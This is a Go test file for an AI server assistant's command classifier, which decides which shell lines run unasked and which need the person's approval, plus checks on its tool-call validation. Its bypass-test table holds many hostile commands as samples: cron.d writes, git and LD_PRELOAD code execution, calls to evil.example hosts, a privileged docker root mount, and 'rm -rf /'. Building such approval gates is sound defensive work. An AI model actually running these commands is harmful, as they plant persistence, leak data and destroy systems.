package assistant

import (
	"strings"
	"testing"
)

// A command is a read only when nothing in it can write: what is misread is asked
// about, and nothing that writes is read as a read.
func TestClassifyCommandReadsOnlyWhatOnlyReads(t *testing.T) {
	for _, c := range []struct{ command, want string }{
		{"df -h", CommandRead},
		{"free -m && uptime", CommandRead},
		{"ls -la /var/log | head -20", CommandRead},
		{"du -sh /var/* 2>/dev/null | sort -rh | head", CommandRead},
		{"cat /etc/os-release", CommandRead},
		{"ps aux --sort=-%mem | head -n 15", CommandRead},
		{"ss -tlnp", CommandRead},
		{"systemctl status nginx --no-pager", CommandRead},
		{"sudo systemctl status caddy", CommandRead},
		{"journalctl -u docker --since '1 hour ago' --no-pager | tail -50", CommandRead},
		{"docker ps -a", CommandRead},
		{"docker compose ps", CommandRead},
		{"docker network ls", CommandRead},
		{"git status && git log --oneline -5", CommandRead},
		{"git remote -v", CommandRead},
		{"nginx -t", CommandRead},
		{"crontab -l", CommandRead},
		{"crontab -l -u www-data", CommandRead},
		{"iptables -L -n", CommandRead},
		{"dpkg -l | grep nginx", CommandRead},
		{"apt list --upgradable", CommandRead},
		{"echo $HOME", CommandRead},
		{"grep -r 'error' /var/log/syslog >&2", CommandRead},
		{"ip a", CommandRead},
		{"ip route show", CommandRead},
		{"timeout 5 ping -c 3 1.1.1.1", CommandRead},
		{"LANG=C date", CommandRead},
		{"openssl x509 -in cert.pem -noout -dates", CommandRead},

		{"touch /tmp/x", CommandChange},
		{"echo hi > /etc/motd", CommandChange},
		{"echo hi >> notes.txt", CommandChange},
		{"cat a | tee b", CommandChange},
		{"systemctl restart nginx", CommandChange},
		{"apt-get install -y htop", CommandChange},
		{"apt install htop", CommandChange},
		{"docker compose up -d", CommandChange},
		{"git pull", CommandChange},
		{"git branch new-feature", CommandChange},
		{"git config user.name bob", CommandChange},
		{"sed -i 's/a/b/' file", CommandChange},
		{"sed -n 1,5p file", CommandChange},
		{"find / -name '*.log' -exec gzip {} \\;", CommandChange},
		{"sort -o out.txt in.txt", CommandChange},
		{"uniq in.txt out.txt", CommandChange},
		{"crontab my.cron", CommandChange},
		{"crontab -e", CommandChange},
		{"date -s '2020-01-01'", CommandChange},
		{"hostname newbox", CommandChange},
		{"dmesg -c", CommandChange},
		{"journalctl --vacuum-time=2d", CommandChange},
		{"nginx -s reload", CommandChange},
		{"iptables -A INPUT -p tcp --dport 22 -j ACCEPT", CommandChange},
		{"dpkg -i pkg.deb", CommandChange},
		{"curl https://example.com", CommandChange},
		{"python3 script.py", CommandChange},
		{"ls $(cat list)", CommandChange},
		{"ls `pwd`", CommandChange},
		{"sleep 100 &", CommandChange},
		{"(cd /tmp && ls)", CommandChange},
		{"cat <<EOF\nhi\nEOF", CommandChange},
		{"echo 'unterminated", CommandChange},
		{"ip link set eth0 down", CommandChange},
		{"openssl req -new -key k -out req.csr", CommandChange},
		{"npm config set registry x", CommandChange},
		{"", CommandChange},

		{"rm -rf /tmp/build", CommandDestructive},
		{"ls && rm file", CommandDestructive},
		{"sudo reboot", CommandDestructive},
		{"systemctl stop nginx", CommandDestructive},
		{"docker rm -f web", CommandDestructive},
		{"docker compose down", CommandDestructive},
		{"docker system prune -af", CommandDestructive},
		{"apt-get purge -y nginx", CommandDestructive},
		{"find /var/log -name '*.gz' -delete", CommandDestructive},
		{"kill -9 1234", CommandDestructive},
		{"mkfs.ext4 /dev/sdb1", CommandDestructive},
		{"dd if=/dev/zero of=/dev/sda", CommandDestructive},
		{"git reset --hard HEAD~1", CommandDestructive},
		{"iptables -F", CommandDestructive},
		{"crontab -r", CommandDestructive},
		{"ufw disable", CommandDestructive},
		{"truncate -s 0 big.log", CommandDestructive},
	} {
		if got := ClassifyCommand(c.command); got != c.want {
			t.Errorf("%q = %s, want %s", c.command, got, c.want)
		}
	}
}

// Every line here writes a file, runs a program of the line's choosing, or
// removes something, and each was once read as a read. A line the classifier
// cannot be sure of asks: none of these may run unasked.
func TestNothingThatWritesOrRunsIsReadAsARead(t *testing.T) {
	for why, lines := range map[string][]string{
		">&word writes word unless it is a stream's number": {
			"echo payload >&/etc/cron.d/x",
			"echo payload >& /etc/cron.d/x",
			"cat /etc/hostname >&/tmp/out",
			"echo a >&1file",
			"echo a >&9/../x",
			"echo a >&2-",
			"echo payload &>/etc/cron.d/x",
			"echo payload >|/etc/x",
			"echo payload 1>/etc/x",
			"echo payload 3>/etc/x",
			"cat <>/etc/cron.d/new",
			"uniq a \"2\">/dev/null",
		},
		"/dev/null is a whole word": {
			"echo x > /dev/null.txt",
			"echo payload >/dev/nullx",
			"echo x >>/dev/null/../etc/x",
		},
		"a variable's value can be a flag, or several words": {
			"X=-delete; find /srv $X",
			"X=-exec; find / -maxdepth 0 $X sh -c 'id > /tmp/pwn' \\;",
			"A=-o; sort /tmp/in $A /etc/cron.d/x",
			"echo a; X=-o; sort /a $X /b",
			"find /srv \"$X\"",
			"sort /tmp/in $A /etc/cron.d/x",
			"echo -delete; find /srv $_",
			"find /srv $'\\x2ddelete'",
			"find /srv $\"-delete\"",
			"sort \"${A}\" /tmp/in",
			"sort /tmp/in ${A:=-o} /etc/x",
			"sudo -u $X cat /etc/passwd",
			"timeout $X ls",
			"$X /etc/passwd",
			"printf $X PATH /tmp",
			"echo $path[1]",
		},
		"so can a file's name that a pattern matches": {
			"find *",
			"sort *.txt",
			"uniq /srv/data/*",
			"xxd /srv/data/?",
			"find /srv -name -ex* touch /tmp/pwn",
		},
		"a line that sets a variable sets it for what follows": {
			"X=-delete",
			"PATH=/tmp/evil:$PATH; ls",
			"IFS=/ ls",
			"LANG=C",
			"printf -v PATH /tmp/evil",
		},
		"a variable set for a command is the command's to obey": {
			"GIT_SSH_COMMAND='touch /tmp/pwn' git ls-remote ssh://a/b",
			"GIT_EXTERNAL_DIFF='touch /tmp/pwn' git diff",
			"GIT_CONFIG_COUNT=1 GIT_CONFIG_KEY_0=core.fsmonitor GIT_CONFIG_VALUE_0='touch /tmp/pwn' git status",
			"LD_PRELOAD=/tmp/x.so ls",
			"PAGER='sh -c id' git log",
			"PATH=/tmp/evil ls",
			"RIPGREP_CONFIG_PATH=/tmp/rc rg x",
			"sudo GIT_SSH_COMMAND=x git status",
			"LANG=/srv/checkout/locale date",
			"TZ=$X date",
		},
		"a wrapper's flag can make it something else": {
			"command time -o /etc/cron.d/x -f '* * * * * root id' true",
			"sudo -e /etc/passwd",
			"sudo -i ls",
			"sudo -s ls",
			"sudo -b ls",
			"ionice -c3 -p 1",
			"nohup ls",
			"exec ls",
			"env X=1 ls",
			"xargs ls",
		},
		"a reader's name elsewhere is somebody's file": {
			"/srv/app/checkout/scripts/cat /etc/passwd",
			"./ls",
			"/tmp/ls -la",
			"/usr/bin/../../tmp/ls",
			"sudo /srv/app/bin/find /",
		},
		"a comment is one shell's and not another's": {
			"echo hi # '\ntouch /tmp/pwn # '",
			"ls # x",
			"ls #",
		},
		"the history is a line nobody wrote here": {
			"find /srv !$",
			"echo \"!!\"",
			"ls !-2",
		},
		"find": {
			"find . -fprint /etc/x",
			"find / -fprintf /etc/x %p",
			"find . -fls /etc/x",
			"find . -fprint0 /etc/x",
			"find . -ok rm {} \\;",
			"find . -execdir sh -c id \\;",
			"find . -okdir id \\;",
			"find . -newfangled /etc/x",
		},
		"sort, tree, uniq, xxd, file, blkid": {
			"sort -o out.txt in.txt",
			"sort -ro /etc/cron.d/x /tmp/in",
			"sort -o/etc/cron.d/x /tmp/in",
			"sort --output=/etc/cron.d/x /tmp/in",
			"sort --out=/etc/cron.d/x /tmp/in",
			"sort --compress-program=/tmp/x.sh big",
			"sort -T /etc big",
			"tree -o /etc/x",
			"tree -R -H x -o y",
			"tree -R -L 1 /",
			"tree -Lo 2 /etc/x",
			"uniq in.txt out.txt",
			"uniq -c in.txt out.txt",
			"xxd -r in out",
			"xxd -r -p /srv/app/payload.hex /etc/cron.d/x",
			"xxd in out",
			"sudo xxd -r -p a /etc/cron.d/x",
			"xxd -revert in out",
			"file -C -m /tmp/magic",
			"file -bC -m /tmp/magic",
			"blkid -c /etc/cron.d/x",
			"blkid -g",
		},
		"date, hostname, dmesg, journalctl": {
			"date -s '2020-01-01'",
			"date --set=2020",
			"date -us '2020-01-01'",
			"date 010100002020",
			"sudo date 010100002020",
			"hostname evil",
			"hostname -F /tmp/name",
			"dmesg -c",
			"dmesg -Tc",
			"dmesg -C",
			"dmesg -n 1",
			"journalctl --vacuum-time=1s",
			"journalctl --rotate",
			"journalctl -n --vacuum-time=1s",
			"journalctl -n 1 --cursor-file=/etc/cron.d/x",
			"journalctl --setup-keys",
			"journalctl --update-catalog",
			"journalctl -M box",
		},
		"rg and ss": {
			"rg --pre sh x /tmp/script",
			"rg --pre=sh x /tmp/script",
			"rg --hostname-bin /tmp/x --hyperlink-format default x",
			"rg -z x",
			"ss -K dst 1.2.3.4",
			"ss -tK",
			"ss -D /tmp/dump",
			"ss --diag=/tmp/dump",
		},
		"git": {
			"git ls-remote --upload-pack='touch /tmp/pwn' /tmp/repo",
			"git ls-remote --exec='touch /tmp/pwn' /tmp/repo",
			"git ls-remote 'ext::sh -c touch% /tmp/pwn'",
			"git ls-remote ext::sh -c id",
			"git ls-remote https://evil.example/somedata",
			"git remote show origin",
			"git -c core.fsmonitor='touch /tmp/x' status",
			"git -ccore.fsmonitor=x status",
			"git --config-env=core.fsmonitor=X status",
			"git -C /srv/app/checkout/embedded.git status",
			"git --git-dir=/srv/x status",
			"git --exec-path=/tmp/x status",
			"git log --output=/etc/cron.d/x",
			"git diff --output=/root/.bashrc",
			"git show --output=x HEAD",
			"git log -S --output=/etc/x",
			"git show --ext-diff HEAD",
			"git log --show-signature",
			"git reflog expire --expire=now --all",
			"git reflog delete HEAD@{1}",
			"git branch -D main",
			"git branch -m main old",
			"git branch -v new-branch",
			"git tag -d v1.0.0",
			"git tag v2",
			"git remote set-url origin https://evil.example/x.git",
			"git remote remove origin",
			"git grep --open-files-in-pager=sh x",
		},
		"docker": {
			"docker compose config -o /etc/cron.d/x",
			"docker compose config --output /etc/cron.d/x",
			"docker compose config --output=/etc/cron.d/x",
			"docker compose -f /srv/checkout/compose.yaml ps",
			"docker compose --file /srv/checkout/compose.yaml config",
			"docker compose --env-file /etc/shadow config",
			"docker compose --project-directory /srv/checkout ps",
			"docker compose ps --file /srv/checkout/compose.yaml",
			"docker -H tcp://evil.example:2375 ps",
			"docker --host ssh://evil.example ps",
			"docker --config /srv/checkout/.docker ps",
			"docker --context other ps",
			"docker ps -H tcp://evil.example:2375",
			"docker container run --privileged -v /:/host alpine true",
			"docker image pull evil/img",
			"docker network disconnect bridge web",
		},
		"openssl": {
			"openssl s_client -connect a:443 -sess_out /etc/x",
			"openssl s_client -connect a:443 -keylogfile /etc/cron.d/x",
			"openssl s_client -connect a:443 -msgfile /etc/cron.d/x",
			"openssl x509 -in a -out /etc/ssl/x.pem",
			"openssl x509 -in a -outform PEM -CAkeyout /etc/x",
			"openssl x509 -in a -noout -writerand /etc/x",
			"openssl x509 -in a -noout -engine /tmp/evil.so",
			"openssl x509 -in a -noout -provider-path /tmp -provider evil",
			"openssl x509 -in a -signkey k",
			"openssl req -new -key k -out req.csr",
			"openssl rand -out /etc/x 16",
		},
		"systemctl, loginctl, systemd-analyze": {
			"systemctl -H root@evil.example status",
			"systemctl --host=root@evil.example status",
			"systemctl -M box status",
			"systemctl edit nginx",
			"systemctl set-property nginx CPUQuota=1%",
			"loginctl terminate-session 1",
			"loginctl kill-user www-data",
			"loginctl enable-linger www-data",
			"loginctl lock-sessions",
			"systemd-analyze -H root@evil.example time",
			"systemd-analyze plot",
		},
		"packages": {
			"apt-cache -oDir::Cache::pkgcache=/etc/cron.d/x policy",
			"apt -o APT::Update::Pre-Invoke::=id list",
			"apt -c /tmp/apt.conf list",
			"dpkg -i pkg.deb",
			"dpkg --root=/srv/x -l",
			"snap install hello",
			"npm config set registry https://evil.example",
			"npm view x --userconfig /tmp/npmrc",
			"npm view --registry=https://evil.example/data x",
			"npm ls --prefix /srv/checkout",
			"npm ls --cache /etc",
			"pm2 delete all",
		},
		"the firewall": {
			"iptables -A INPUT -j DROP",
			"iptables -I INPUT -j DROP",
			"iptables -L --modprobe=/tmp/x",
			"iptables -L -Z",
			"iptables -nLZ",
			"nft -f /tmp/x list ruleset",
			"nft list ruleset \\; flush ruleset",
			"nft 'list ruleset; flush ruleset'",
			"nft flush ruleset",
			"ufw allow 22",
			"ufw status; ufw --force enable",
			"fail2ban-client set sshd unbanip 1.2.3.4",
			"fail2ban-client -c /tmp/conf status",
		},
		"the rest": {
			"crontab /srv/app/cron.txt",
			"crontab -l -e",
			"crontab -lr",
			"certbot certificates --config-dir /tmp",
			"certbot certificates --logs-dir /etc/cron.d",
			"certbot renew",
			"nginx -t -c /srv/checkout/evil.conf",
			"nginx -t -g 'load_module /tmp/x.so;'",
			"nginx -q",
			"nginx",
			"apache2ctl -t -f /tmp/evil.conf",
			"ip -b /tmp/cmds",
			"ip -batch /tmp/cmds addr show",
			"ip -n ns1 link set lo up",
			"ip netns exec x sh",
			"ip l set eth0 down",
			"ip route del default",
			"ip addr flush dev eth0",
			"awk 'BEGIN{system(\"id\")}'",
			"sed -i s/a/b/ /etc/passwd",
			"tee /etc/x",
			"env X=1 rm -rf /",
		},
	} {
		for _, line := range lines {
			if got := ClassifyCommand(line); got == CommandRead {
				t.Errorf("%s: %q is read as a read", why, line)
			}
		}
	}
}

// What the table lists still runs unasked: a line somebody would type to look
// at a server, written the ways they write it.
func TestAReadWrittenTheUsualWaysIsStillARead(t *testing.T) {
	for _, line := range []string{
		"echo payload >&2",
		"echo payload 2>&1",
		"ls >&-",
		"ls -la /srv 2>/dev/null",
		"ls -la /srv > /dev/null 2>&1",
		"cat < /etc/hostname",
		"echo $HOME; ls $HOME/.ssh",
		"ls /var/log/*.log | wc -l",
		"cat /etc/nginx/sites-enabled/* | grep -c server_name",
		"[ -f /etc/os-release ] && cat /etc/os-release",
		"test ! -e /tmp/x || ls -l /tmp/x",
		"grep -v '!' /etc/passwd",
		"grep '#include' /etc/sudoers",
		"/usr/bin/ls -la",
		"sudo -n /usr/sbin/nginx -t",
		"sudo -u postgres -n id",
		"sudo -l",
		"LC_ALL=C sort -u /etc/shells",
		"TZ=Europe/Vienna date +%H:%M",
		"COLUMNS=200 ps aux",
		"GIT_PAGER=cat git log -3",
		"SYSTEMD_PAGER= systemctl status nginx",
		"nice -n 10 du -sh /var",
		"timeout -k 2 10 journalctl -u nginx -n 20",
		"command -v docker",
		"find /var/log -type f -name '*.log' -mtime -7 -size +1M",
		"find /srv -maxdepth 2 -newermt '2026-01-01' ! -name '.git' -print",
		"find /etc -perm -u+s -printf '%p\\n'",
		"sort -t: -k3 -n /etc/passwd",
		"sort -rnk2",
		"uniq -c",
		"uniq -f 1 names.txt",
		"xxd -l 64 /bin/ls",
		"file -b --mime-type /srv/app/logo.png",
		"date -u +%Y-%m-%dT%H:%M:%SZ",
		"date -d '1 hour ago' +%s",
		"hostname -f",
		"dmesg -T --level=err,warn",
		"journalctl -b -1 -p err --no-pager",
		"journalctl --since=-1h -u caddy -o json",
		"rg -n --hidden -g '*.go' TODO /srv/app",
		"ss -tulpn",
		"ss -s",
		"systemctl list-units --type=service --state=failed --no-pager",
		"systemctl show nginx -p ActiveState --value",
		"systemctl is-active nginx",
		"systemctl",
		"loginctl list-sessions --no-legend",
		"systemd-analyze blame --no-pager",
		"docker ps --format '{{.Names}}' -a",
		"docker ps -aq --filter status=exited",
		"docker logs --tail 50 web",
		"docker logs -n 50 -t web",
		"docker inspect -f '{{.State.Status}}' web",
		"docker images --digests",
		"docker stats --no-stream",
		"docker compose -p shop ps -a",
		"docker compose ls",
		"docker compose logs --tail=100 web",
		"docker compose config --services",
		"docker system df -v",
		"docker volume ls -q",
		"docker --version",
		"git --no-pager log --oneline --graph -n 20",
		"git log -5 --pretty=format:%h --since='2 weeks ago' -- src",
		"git show --stat HEAD~1",
		"git diff --cached --name-only",
		"git status -sb",
		"git branch -a -vv",
		"git branch --show-current",
		"git branch --list 'feat/*'",
		"git branch --merged main",
		"git tag -l 'v0.8.*'",
		"git remote get-url origin",
		"git remote show -n origin",
		"git rev-parse --abbrev-ref HEAD",
		"git describe --tags --always",
		"git ls-files -o --exclude-standard",
		"git blame -L 10,20 main.go",
		"git reflog -5",
		"git reflog show main",
		"apt list --installed",
		"apt-cache policy docker-ce",
		"dpkg -L nginx",
		"dpkg-query -W -f '${Package} ${Version}\\n' nginx",
		"snap list --all",
		"crontab -u www-data -l",
		"ufw status verbose",
		"ufw show added",
		"iptables -t nat -nvL PREROUTING --line-numbers",
		"iptables -S",
		"nft -a list ruleset",
		"nft list table inet filter",
		"fail2ban-client status sshd",
		"openssl x509 -in /etc/ssl/certs/site.pem -noout -enddate -subject",
		"openssl verify -CAfile ca.pem site.pem",
		"openssl ciphers -v 'HIGH:!aNULL'",
		"openssl version -a",
		"certbot certificates --cert-name example.org",
		"pm2 jlist",
		"npm ls -g --depth=0",
		"npm config get registry",
		"ip -br a",
		"ip -4 addr show dev eth0",
		"ip route get 1.1.1.1",
		"nginx -T",
		"apache2ctl -S",
		"printf '%s\\n' a b",
	} {
		if got := ClassifyCommand(line); got != CommandRead {
			t.Errorf("%q = %s, want a read", line, got)
		}
	}
}

// A flag is read as the program reads it: in a run of short ones, written onto
// its value, or with its value as the word after, and never a word after that
// the program would take for a flag of its own.
func TestFlagsAreReadAsTheProgramReadsThem(t *testing.T) {
	f := flagsOf("-a -b -n? -u: -# --all --lines? --user=")
	for _, c := range []struct {
		args     string
		ok       bool
		operands string
	}{
		{"-ab x", true, "x"},
		{"-abn5 x", true, "x"},
		{"-n 5", true, "5"},
		{"-an", true, ""},
		{"-u root x", true, "x"},
		{"-uroot x", true, "x"},
		{"-au root x", true, "x"},
		{"-u", false, ""},
		{"--user root x", true, "x"},
		{"--user=root x", true, "x"},
		{"--user", false, ""},
		{"--lines=5 x", true, "x"},
		{"--lines 5", true, "5"},
		{"--all=yes", false, ""},
		{"--al", false, ""},
		{"-5 x", true, "x"},
		{"-ax", false, ""},
		{"-x", false, ""},
		{"- x", true, "- x"},
		{"x -- -z --zeta", true, "x -z --zeta"},
		// -n takes what is written onto it, so the word after is read for itself.
		{"-n --zeta", false, ""},
	} {
		g, ok := f.read(strings.Fields(c.args))
		if ok != c.ok || ok && strings.Join(g.operands, " ") != c.operands {
			t.Errorf("%q = %v %q, want %v %q", c.args, ok, g.operands, c.ok, c.operands)
		}
	}
	if g, n, ok := f.lead(strings.Fields("-a -u root ls -x")); !ok || n != 3 || !g.seen["-u"] {
		t.Errorf("the flags in front took %d words (%v)", n, ok)
	}
	w := wordsOf("-noout -in:")
	for args, want := range map[string]bool{
		"-in a -noout": true, "-in -out -noout": true, "-in": false, "-out x": false, "-inform": false, "x -noout y": true,
	} {
		if _, ok := w.read(strings.Fields(args)); ok != want {
			t.Errorf("%q = %v, want %v", args, ok, want)
		}
	}
}

// A run_command call is read as the others are: what is missing is said, a
// working directory is a cd, and the time is held to its bounds.
func TestARunCommandCallIsCheckedLikeTheOthers(t *testing.T) {
	check := CheckCalls(ServerTools)
	calls, err := check([]Block{
		{Type: BlockToolUse, ToolID: "a", ToolName: ToolRunCommand, Input: []byte(`{"command":"ls","cwd":"/srv/my app","timeout":9999,"reason":"Listing."}`)},
		{Type: BlockToolUse, ToolID: "b", ToolName: ToolRunCommand, Input: []byte(`{"reason":"Nothing."}`)},
		{Type: BlockToolUse, ToolID: "c", ToolName: ToolRunCommand, Input: []byte(`{"cmd":"uptime"}`)},
	})
	if err != nil {
		t.Fatal(err)
	}
	first := calls[0].CommandInput()
	if first.Command != `cd '/srv/my app' && ls` || first.Timeout != CommandWaitMax || calls[0].Problem != "" {
		t.Errorf("first = %+v %q", first, calls[0].Problem)
	}
	if !strings.Contains(calls[0].NotesText(), "cwd") {
		t.Errorf("the cd was not noted: %q", calls[0].NotesText())
	}
	if !strings.Contains(calls[1].Problem, "command is required") {
		t.Errorf("second = %q", calls[1].Problem)
	}
	if got := calls[2].CommandInput(); got.Command != "uptime" || got.Timeout != CommandWaitDefault {
		t.Errorf("third = %+v", got)
	}
	setup := CheckCalls(SetupTools)
	calls, _ = setup([]Block{{Type: BlockToolUse, ToolID: "a", ToolName: ToolRunCommand, Input: []byte(`{"command":"ls"}`)}})
	if !strings.Contains(calls[0].Problem, "no tool called") {
		t.Errorf("a new deployment's chat ran a command: %q", calls[0].Problem)
	}
}

// Every chat that talks with the person can run a command; the prompts say how.
func TestThePromptsOfferTheShell(t *testing.T) {
	for name, tools := range map[string][]Tool{"deployment": AgentTools, "server": ServerTools, "database": DatabaseTools} {
		found := false
		for _, tool := range tools {
			found = found || tool.Name == ToolRunCommand
		}
		if !found {
			t.Errorf("%s's chat has no run_command", name)
		}
	}
	prompt := DatabaseSystemPrompt(DatabaseContext{ID: 4, Name: "shop", Engine: "PostgreSQL", Version: "17.2", Structure: "TABLE orders(id integer)"}, APIOverview{})
	for _, want := range []string{"shop", "PostgreSQL 17.2", "TABLE orders", "/databases/4", "run_command", "a good general assistant"} {
		if !strings.Contains(prompt, want) {
			t.Errorf("the database prompt has no %q", want)
		}
	}
	server := ServerSystemPrompt(ServerContext{Server: "box", About: &ChatAbout{Path: "/docker/stacks/web", Title: "web stack"}}, APIOverview{})
	if !strings.Contains(server, `"web stack" (/docker/stacks/web)`) {
		t.Errorf("the server prompt does not say where it was opened: %s", server)
	}
}

// The terminal's calls are read as the others are: a command is one line, keys
// are read by their usual names, waits are held to their bounds, and the mode
// reads a command by what it does and anything typed as a change.
func TestTheTerminalsCallsAreChecked(t *testing.T) {
	check := CheckCalls(ServerTools)
	calls, err := check([]Block{
		{Type: BlockToolUse, ToolID: "a", ToolName: ToolTerminalRun, Input: []byte(`{"command":"apt-get upgrade","wait":9999,"reason":"x"}`)},
		{Type: BlockToolUse, ToolID: "b", ToolName: ToolTerminalRun, Input: []byte(`{"command":"ls\nrm -rf /","reason":"x"}`)},
		{Type: BlockToolUse, ToolID: "c", ToolName: ToolTerminalSend, Input: []byte(`{"text":"y","keys":["Ctrl+C","Return","^C"],"reason":"x"}`)},
		{Type: BlockToolUse, ToolID: "d", ToolName: ToolTerminalSend, Input: []byte(`{"keys":["F13"],"reason":"x"}`)},
		{Type: BlockToolUse, ToolID: "e", ToolName: ToolTerminalSend, Input: []byte(`{"text":"2","enter":false,"reason":"x"}`)},
		{Type: BlockToolUse, ToolID: "f", ToolName: ToolTerminalRead, Input: []byte(`{}`)},
		{Type: BlockToolUse, ToolID: "g", ToolName: ToolTerminalRun, Input: []byte(`{"command":"df -h"}`)},
	})
	if err != nil {
		t.Fatal(err)
	}
	if in := calls[0].TerminalInput(); in.Command != "apt-get upgrade" || in.Wait != TerminalWaitMax || calls[0].Problem != "" {
		t.Errorf("a = %+v %q", in, calls[0].Problem)
	}
	if !strings.Contains(calls[1].Problem, "one line") {
		t.Errorf("b = %q", calls[1].Problem)
	}
	if in := calls[2].TerminalInput(); strings.Join(in.Keys, ",") != "ctrl-c,enter,ctrl-c" || in.Typed() != "y\r\x03\r\x03" {
		t.Errorf("c = %+v %q", in, in.Typed())
	}
	if !strings.Contains(calls[3].Problem, `no key "F13"`) {
		t.Errorf("d = %q", calls[3].Problem)
	}
	if in := calls[4].TerminalInput(); in.Typed() != "2" {
		t.Errorf("e = %q", in.Typed())
	}
	if in := calls[5].TerminalInput(); in.Wait != TerminalReadDefault {
		t.Errorf("f = %+v", in)
	}
	for i, want := range []string{CommandChange, CommandChange, CommandChange, CommandChange, CommandChange, CommandRead, CommandRead} {
		if i == 1 || i == 3 {
			continue
		}
		if got := TerminalKind(calls[i]); got != want {
			t.Errorf("call %d is %s, want %s", i, got, want)
		}
	}
	for name, tools := range map[string][]Tool{"deployment": AgentTools, "server": ServerTools, "database": DatabaseTools} {
		count := 0
		for _, tool := range tools {
			if tool.Name == ToolTerminalRun || tool.Name == ToolTerminalSend || tool.Name == ToolTerminalRead {
				count++
			}
		}
		if count != 3 {
			t.Errorf("%s's chat has %d of the terminal's tools", name, count)
		}
	}
	if prompt := ServerSystemPrompt(ServerContext{}, APIOverview{}); !strings.Contains(prompt, "Never type a password") || !strings.Contains(prompt, "terminal_read with a long wait") {
		t.Errorf("the prompt does not say how a password is typed")
	}
}

// What run_command types into the chat's terminal window: a line that changes
// packages, which can restart Docker and with it the dashboard, or that restarts
// Docker itself. Reading about packages runs on its own.
func TestCommandForTerminal(t *testing.T) {
	for line, want := range map[string]string{
		"sudo apt-get update && sudo DEBIAN_FRONTEND=noninteractive apt-get -y upgrade": TerminalForPackages,
		"apt install -y jq": TerminalForPackages,
		"apt-get -o Dpkg::Options::=--force-confold dist-upgrade -y": TerminalForPackages,
		"sudo dnf -y update":                          TerminalForPackages,
		"yum install nginx":                           TerminalForPackages,
		"zypper dup":                                  TerminalForPackages,
		"apk add curl":                                TerminalForPackages,
		"snap refresh":                                TerminalForPackages,
		"sudo dpkg -i ./thing.deb":                    TerminalForPackages,
		"dpkg --configure -a":                         TerminalForPackages,
		"pacman -Syu --noconfirm":                     TerminalForPackages,
		"pacman -R vim":                               TerminalForPackages,
		"sudo unattended-upgrade -d":                  TerminalForPackages,
		"timeout 600 sudo apt-get upgrade -y":         TerminalForPackages,
		"sudo systemctl restart docker":               TerminalForDocker,
		"systemctl stop docker.socket docker.service": TerminalForDocker,
		"sudo service docker restart":                 TerminalForDocker,
		"systemctl restart containerd":                TerminalForDocker,
		"apt-get update":                              "",
		"apt list --upgradable":                       "",
		"apt-cache policy docker-ce":                  "",
		"dnf check-update":                            "",
		"dpkg -l | grep docker":                       "",
		"pacman -Ss vim":                              "",
		"pacman -Qi vim":                              "",
		"snap list":                                   "",
		"systemctl status docker":                     "",
		"systemctl restart nginx":                     "",
		"docker ps":                                   "",
		"grep -r upgrade /var/log/apt/history.log":    "",
	} {
		if got := CommandForTerminal(line); got != want {
			t.Errorf("%q = %q, want %q", line, got, want)
		}
	}
}

func TestCommandAsksSudo(t *testing.T) {
	for line, want := range map[string]bool{
		"sudo systemctl restart nginx":                  true,
		"sudo -u postgres psql -c 'select 1'":           true,
		"FOO=1 sudo -E make install":                    true,
		"timeout 30 sudo ls /root":                      true,
		"cd /srv && sudo git pull":                      true,
		"sudo -n systemctl restart nginx":               false,
		"sudo --non-interactive true":                   false,
		"sudo -nE true":                                 false,
		"echo secret | sudo -S true":                    false,
		"systemctl status nginx":                        false,
		"grep sudo /var/log/auth.log":                   false,
		"echo 'sudo is mentioned, not run' > /dev/null": false,
	} {
		if got := CommandAsksSudo(line); got != want {
			t.Errorf("%q = %v, want %v", line, got, want)
		}
	}
}
